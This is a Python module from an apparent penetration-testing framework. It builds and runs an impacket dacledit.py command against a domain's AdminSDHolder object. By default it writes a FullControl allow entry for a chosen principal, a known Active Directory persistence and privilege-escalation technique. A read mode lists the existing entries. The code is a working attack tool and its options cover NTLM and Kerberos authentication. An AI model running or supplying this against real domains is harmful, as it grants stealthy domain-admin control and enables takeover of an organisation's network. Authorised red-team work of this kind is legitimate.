import os
import shlex

from module import BaseModule
from tool import Tool


class AdminSDHolderACL(BaseModule):
    path = "acl/adminsdholder"
    description = "Read or write AdminSDHolder DACL entries using dacledit."
    options = {
        "dc_ip": {
            "default": "",
            "description": "Domain Controller IP or host address. If empty, domain will be used.",
            "required": False,
        },
        "domain": {
            "default": "",
            "description": "Auth: Domain name (FQDN)",
            "required": True,
        },
        "username": {"default": "", "description": "Auth: Username", "required": True},
        "password": {
            "default": "",
            "description": "Auth: Password or NT Hash (for NTLM auth only)",
            "required": False,
        },
        "auth": {
            "default": "ntlm",
            "description": "Auth: Type (ntlm, krb)",
            "required": True,
        },
        "action": {
            "default": "write",
            "description": "dacledit action (read, write)",
            "required": False,
        },
        "domain_bind_dn": {
            "default": "",
            "description": "Optional domain DN (for example: DC=domain,DC=local). Auto-derived from `domain` if empty.",
            "required": False,
        },
        "principal": {
            "default": "",
            "description": "Principal/account to grant or query ACL entries for (defaults to auth username)",
            "required": False,
        },
    }

    def __init__(self, registry, job_manager):
        super().__init__(registry, job_manager)

    @staticmethod
    def _domain_to_dn(domain: str) -> str:
        return ",".join(f"DC={part}" for part in domain.split(".") if part)

    def _resolve_bind_dn(self) -> str:
        bind_dn = (self.opts.domain_bind_dn or "").strip()
        if bind_dn:
            return bind_dn
        return self._domain_to_dn((self.opts.domain or "").strip())

    def _ensure_krb_identity(self, auth_params: list[str]) -> list[str]:
        if self.opts.auth != "krb":
            return auth_params

        has_identity = False
        for param in auth_params:
            if not param or param.startswith("-") or param.startswith("@"):
                continue
            has_identity = True
            break

        if not has_identity:
            auth_params.append(f"{self.opts.domain}/{self.opts.username}")

        return auth_params

    async def run(self):
        if not self.validate_options():
            return

        os.chdir(self.logs_dir)

        tool = Tool(self)
        tool.set_output_pane(self.pane_b)
        if not tool.set_auth(from_module=True):
            return

        action = (self.opts.action or "write").strip().lower()
        if action not in {"read", "write"}:
            self.pane_a.write("[red][!] Option `action` must be `read` or `write`.[/red]")
            return

        bind_dn = self._resolve_bind_dn()
        if not bind_dn:
            self.pane_a.write(
                "[red][!] Could not determine `domain_bind_dn`. Set `domain_bind_dn` or provide a valid `domain`.[/red]"
            )
            return

        principal = (self.opts.principal or "").strip() or self.opts.username
        if not principal:
            self.pane_a.write(
                "[red][!] Option `principal` is empty and auth `username` is missing.[/red]"
            )
            return

        target_dn = f"CN=AdminSDHolder,CN=System,{bind_dn}"
        auth_params = tool.get_auth_params("impacket")
        if not auth_params:
            return

        auth_params = self._ensure_krb_identity(auth_params)

        command_parts = [
            "dacledit.py",
            "-action",
            action,
            "-target-dn",
            target_dn,
            "-principal",
            principal,
        ]
        dc_ip = str(self.opts.dc_ip or "").strip()
        if dc_ip:
            command_parts += ["-dc-ip", dc_ip]
        if action == "write":
            command_parts += ["-rights", "FullControl", "-ace-type", "allowed"]

        command_parts += auth_params

        if action == "write":
            tool.title(f"Write FullControl on AdminSDHolder for {principal}")
        else:
            tool.title(f"Read AdminSDHolder DACL entries for {principal}")

        write_success = action == "read"
        async for line in self.run_command(shlex.join(command_parts), self.pane_b):
            if action == "write" and "modified successfully" in line.lower():
                line = f"[green]{line}[/green]"
                write_success = True
            self.pane_b.write(line)

        if action == "write" and not write_success:
            self.pane_a.write(
                "[yellow][!] No explicit success marker found in dacledit output. Review command output.[/yellow]"
            )
